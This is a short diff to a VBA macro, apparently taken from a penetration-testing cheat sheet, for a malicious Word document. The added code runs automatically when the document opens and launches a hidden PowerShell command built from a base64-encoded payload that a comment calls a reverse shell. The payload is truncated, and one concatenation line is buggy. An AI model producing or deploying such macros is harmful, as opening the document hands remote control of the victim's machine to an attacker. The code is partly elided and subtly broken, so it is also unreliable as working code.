@@ -1,12 +1,21 @@
-# From: https://systemweakness.com/ms-word-macros-with-powercat-reverse-shell-58b20983e0f0
+# From https://github.com/deo-gracias/oscp/blob/master/pentest_command_cheat_sheet.md
 
 Sub AutoOpen()
-MyMacro
-End SubSub Document_Open()
+	MyMacro
+End Sub
 
-MyMacro
-End SubSub 
+Sub Document_Open()
+	MyMacro
+End Sub
 
-MyMacro()
-<paste code here>
+Sub MyMacro()
+	Dim Str As String
+
+	'This part is a comment, following line is powershell reverse shell which size is fit by above script 
+	Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+	Str += "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+	...
+	Str += Str + "QA"
+
+	CreateObject("Wscript.Shell").Run Str
 End Sub
